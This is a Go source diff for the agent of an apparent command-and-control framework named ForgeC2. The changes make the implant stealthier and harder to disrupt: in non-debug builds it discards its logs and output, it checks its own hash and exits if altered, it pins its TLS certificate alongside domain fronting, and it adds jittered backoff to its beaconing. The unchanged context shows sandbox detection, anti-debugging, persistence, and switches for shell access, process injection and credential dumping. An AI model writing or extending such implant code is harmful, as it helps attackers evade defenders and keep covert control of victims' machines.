@@ -6,6 +6,7 @@ package main
 import (
 	"bytes"
 	"crypto/rand"
+	"crypto/sha256"
 	"crypto/tls"
 	"encoding/binary"
 	"encoding/hex"
@@ -19,6 +20,7 @@ import (
 	"net/url"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"runtime"
 	"strconv"
 	"strings"
@@ -67,15 +69,15 @@ func init() {
 			currentEnvClass = envClass
 			currentOpsProfile = opsProfile
 			envDetected = true
-			if !opsProfile.AllowShell {
-				log.Println("[env] Shell commands disabled in this environment")
-			}
-			if !opsProfile.AllowInjection {
-				log.Println("[env] Process injection disabled in this environment")
-			}
-			if !opsProfile.AllowCredDump {
-				log.Println("[env] Credential dumping disabled in this environment")
-			}
+		if !opsProfile.AllowShell {
+			logDebug("[env] Shell commands disabled in this environment")
+		}
+		if !opsProfile.AllowInjection {
+			logDebug("[env] Process injection disabled in this environment")
+		}
+		if !opsProfile.AllowCredDump {
+			logDebug("[env] Credential dumping disabled in this environment")
+		}
 		}
 	}()
 
@@ -151,7 +153,7 @@ func init() {
 		antiDebugScore = score
 		if score > 20 {
 			antiDebugTriggered = true
-			log.Printf("[antidebug] Detection score: %d/%d checks triggered", score, len(details))
+			logDebugf("[antidebug] Detection score: %d/%d checks triggered", score, len(details))
 			if score > 50 {
 				enterGhostMode("anti-debug threshold exceeded")
 			} else {
@@ -182,6 +184,9 @@ func init() {
 	if v := os.Getenv("FORGEC2_PERSIST_PREFIX"); v != "" {
 		persistencePrefix = v
 	}
+
+	// Certificate pinning
+	initTLSPinning()
 
 	// SSH transport config
 	initSSHConfig()
@@ -218,7 +223,7 @@ func init() {
 	if ExpiryDateStr != "" {
 		kd, err := time.Parse("2006-01-02", ExpiryDateStr)
 		if err == nil && time.Now().After(kd) {
-			fmt.Println("Expiry date reached, exiting.")
+			debugLog("Expiry date reached, exiting.")
 			os.Exit(0)
 		}
 	}
@@ -290,10 +295,7 @@ func init() {
 			MaxIdleConns:        10,
 			MaxIdleConnsPerHost: 5,
 			IdleConnTimeout:     60 * time.Second,
-			TLSClientConfig:     &tls.Config{InsecureSkipVerify: SkipTLSVerify},
-		}
-		if DomainFront != "" {
-			tr.TLSClientConfig.ServerName = DomainFront
+			TLSClientConfig:     newAgentTLSConfig(DomainFront),
 		}
 	}
 	if ProxyStr != "" {
@@ -314,8 +316,38 @@ func init() {
 	}
 }
 
+func verifySelfIntegrity() {
+	exePath, err := os.Executable()
+	if err != nil {
+		return
+	}
+	exePath, err = filepath.EvalSymlinks(exePath)
+	if err != nil {
+		return
+	}
+	data, err := os.ReadFile(exePath)
+	if err != nil {
+		return
+	}
+	h := sha256.Sum256(data)
+	actual := hex.EncodeToString(h[:])
+	if actual != SelfCheckSHA256Str {
+		os.Exit(1)
+	}
+}
+
 func main() {
 	log.SetFlags(0)
+	if !Debug {
+		log.SetOutput(io.Discard)
+		os.Stdout, _ = os.Open(os.DevNull)
+		os.Stderr, _ = os.Open(os.DevNull)
+	}
+
+	if SelfCheckSHA256Str != "" {
+		verifySelfIntegrity()
+	}
+
 	setDPIAware()
 	if Debug {
 		fmt.Println(s(SForgeC2), "Agent starting...")
@@ -330,7 +362,7 @@ func main() {
 	result := detector.Detect()
 	inSandbox = result.IsSandbox
 	if inSandbox {
-		log.Printf(s(SForgeC2)+" Sandbox detected (confidence: %d%%), entering benign mode", result.Confidence)
+		logDebugf("Sandbox detected (confidence: %d%%), entering benign mode", result.Confidence)
 	}
 
 	// Initial registration / first beacon
@@ -435,6 +467,24 @@ func main() {
 
 		doBeacon()
 		beaconCount++
+
+		// Exponential backoff on consecutive beacon failures
+		if beaconConsecutiveFailures > 0 {
+			backoffSec := 1 << uint(beaconConsecutiveFailures-1) // 1, 2, 4, 8, 16...
+			if backoffSec > 300 {
+				backoffSec = 300 // cap at 5 minutes
+			}
+			// Add jitter: ±25%
+			jitterRange := backoffSec / 4
+			if jitterRange > 0 {
+				backoffSec += int(mathRand.Int31n(int32(2*jitterRange+1))) - jitterRange
+			}
+			if Debug {
+				fmt.Printf("[!] Beacon backoff: sleeping %ds (failures=%d)\n", backoffSec, beaconConsecutiveFailures)
+			}
+			time.Sleep(time.Duration(backoffSec) * time.Second)
+			continue
+		}
 
 		// Notify scheduler after beacon
 		if runtime.GOOS == "windows" && beaconSched != nil {
@@ -806,11 +856,14 @@ func doBeacon() {
 		pendingResults = append(resultsCopy, pendingResults...)
 		pendingTaskAcks = append(acksCopy, pendingTaskAcks...)
 		pendingMu.Unlock()
+		beaconConsecutiveFailures++
 		if Debug {
-			fmt.Println("[!] Beacon returned nil, skipping")
+			fmt.Printf("[!] Beacon returned nil, consecutive failures: %d\n", beaconConsecutiveFailures)
 		}
 		return
 	}
+
+	beaconConsecutiveFailures = 0
 
 	// Parse response
 	var resp BeaconResponse
@@ -1014,10 +1067,7 @@ func sendTCPBeacon(body []byte) []byte {
 	// Basic TLS support when SkipTLSVerify or using tls:// scheme
 	useTLS := SkipTLSVerify || strings.HasPrefix(C2URL, "tls://")
 	if useTLS {
-		tlsCfg := &tls.Config{InsecureSkipVerify: SkipTLSVerify}
-		if DomainFront != "" {
-			tlsCfg.ServerName = DomainFront
-		}
+		tlsCfg := newAgentTLSConfig(DomainFront)
 		conn, err = tls.Dial("tcp", addr, tlsCfg)
 	} else {
 		conn, err = net.Dial("tcp", addr)
